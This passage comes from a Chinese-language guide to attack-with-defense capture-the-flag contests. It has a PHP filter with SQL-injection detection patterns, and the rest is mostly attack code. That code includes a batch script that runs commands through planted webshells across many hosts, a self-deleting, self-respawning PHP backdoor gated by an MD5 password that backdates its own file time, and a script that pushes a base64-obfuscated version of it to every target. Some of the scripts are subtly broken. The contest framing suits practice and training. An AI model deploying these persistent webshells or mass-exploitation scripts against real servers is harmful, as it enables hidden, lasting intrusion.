class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>如果可以我们还可以上通防（一般都是不行）</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">&lt;!-- \nrequire_once('waf.php')\n\nPHPCMS V9 \\phpcms\\base.php\nPHPWIND8.7 \\data\\sql_config.php\nDEDECMS5.7 \\data\\common.inc.php\nDiscuzX2   \\config\\config_global.php\nWordpress   \\wp-config.php\nMetinfo   \\include\\head.php\n--></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">customError</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$errno</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errstr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errfile</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errline</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;b>Error number:&lt;/b> [<span class=\"token interpolation\"><span class=\"token variable\">$errno</span></span>],error on line <span class=\"token interpolation\"><span class=\"token variable\">$errline</span></span> in <span class=\"token interpolation\"><span class=\"token variable\">$errfile</span></span>&lt;br />\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">set_error_handler</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"customError\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$getfilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"'|(and|or)\\\\b.+?(>|&lt;|=|in|like)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$postfilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\\\b(and|or)\\\\b.&#123;1,6&#125;?(=|>|&lt;|\\\\bin\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cookiefilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\\\b(and|or)\\\\b.&#123;1.6&#125;?(=|>|&lt;|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltKey</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ArrFiltReq</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$StrFiltValue</span> <span class=\"token operator\">=</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ArrFiltReq</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/is\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token comment\">//slog (\"&lt;br>&lt;br > 操作 IP:\".$_SERVER [\"REMOTE_ADDR\"].\"&lt;br > 操作时间:\".strftime (\"% Y-% m-% d % H:% M:% S\").\"&lt;br > 操作页面:\".$_SERVER [\"PHP_SELF\"].\"&lt;br > 提交方式:\".$_SERVER [\"REQUEST_METHOD\"].\"&lt;br > 提交参数:\".$StrFiltKey.\"&lt;br > 提交参数:\".$StrFiltValue);</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"360WebSec notice: Illegal operation!\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//$ArrPGC = array_merge($_GET, $_POST, $_COOKIE);</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$getfilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$postfilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cookiefilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token comment\"># code...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">slog</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$logs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$toppath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"DOCUMENT_ROOT\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/log.htm\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$Ts</span><span class=\"token operator\">=</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$toppath</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"a+\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Ts</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$logs</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Ts</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>对于别人上传过来的不死马进行处理</p>\n<ul>\n<li>杀死进程，可以使用 ps aux 命令 列出所有进程，找到要杀掉的进程运用命令，kill pid 就可以了</li>\n<li>通过条件竞争写入无效内容或者删除不死马文件，代码如下（竞争写入无关内容，config 是木马名）</li>\n</ul>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'.config.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'???'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//pass=pass</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'touch -m -d \"2018-12-01 09:10:12\" .config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">usleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>当然最好的防御还是攻击</p>\n<h2 id=\"利用漏洞攻击\"><a class=\"anchor\" href=\"#利用漏洞攻击\">#</a> 利用漏洞攻击</h2>\n<p>d 盾扫出来的 shell 只要手快还是可以先打一波的，可以在赛前提前写好简单的 shell 利用批量化脚本</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> fontTools<span class=\"token punctuation\">.</span>afmLib\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> json\n<span class=\"token keyword\">import</span> re\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> url1<span class=\"token punctuation\">:</span>\n    data<span class=\"token operator\">=</span>url1<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\npaylaod2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\nheader2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"token\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">#平台 url</span>\nurl2 <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n        urlpro<span class=\"token operator\">=</span><span class=\"token string\">\"http://&#123;&#125;/.a.php?c=system('cat /flag.txt');\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        res<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>urlpro<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(urlpro)</span>\n        p<span class=\"token operator\">=</span>re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.*&#125;\"</span><span class=\"token punctuation\">)</span>\n        a<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n        paylaod2<span class=\"token punctuation\">[</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a\n        <span class=\"token comment\"># print(paylaod2)</span>\n        <span class=\"token comment\"># post 请求</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">,</span> paylaod2<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header2<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>当然这样可能只能拿到一轮的分数，所以我们可以上传不死马，下面是一个常用的 MD5 不死马</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 设置与客户机断开是否会终止脚本的执行，这里设置为 true 则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span>\n    <span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 设置脚本最大执行时间，这里设置为 0，即没有时间方面的限制</span>\n    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除文件本身，以起到隐蔽自身的作用</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'.config.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'&lt;?php if(md5($_GET[\"pass\"])==\"1a1dc91c907325c69271ddf0c944bc72\")&#123;@eval($_POST[xcu]);&#125; ?>'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//pass=pass</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'touch -m -d \"2018-12-01 09:10:12\" .config2.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'chmod 777 .config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">usleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//while 循环中每隔 usleep (0) 即写新的后门文件，system 命令用于修改文件的创建时间或修改时间，因为在 AWD 比赛中有的队伍使用</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> json\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\n\nnodie <span class=\"token operator\">=</span> <span class=\"token string\">\"PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo=\"</span>\npoc <span class=\"token operator\">=</span> <span class=\"token string\">\"fputs(fopen('/var/www/html/nodie.php','w'),base64_decode('PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo='));\"</span>\n\nheader2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n         <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">#提交 flag</span>\nurl4<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n\npayload2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\npayload3<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"xcu\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('cat /flag.txt');\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#执行命令</span>\n        url1 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;?a=\"</span><span class=\"token operator\">+</span>poc<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url1)</span>\n        res1 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url1<span class=\"token punctuation\">)</span>\n        url2 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;/nodie.php\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url2)</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">)</span>\n        url3 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;/.config1.php\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url3)</span>\n        res3 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url3<span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span>\n        p <span class=\"token operator\">=</span> res3<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.*&#125;\"</span><span class=\"token punctuation\">)</span>\n        a <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(a)</span>\n        <span class=\"token comment\"># 将 a 存入 paylaod2 中</span>\n        paylaod2<span class=\"token punctuation\">[</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a\n        <span class=\"token comment\">#time.sleep(1)</span>\n        <span class=\"token comment\"># print(paylaod2)</span>\n        <span class=\"token comment\"># post 请求</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url4<span class=\"token punctuation\">,</span> paylaod2<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header2<span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token 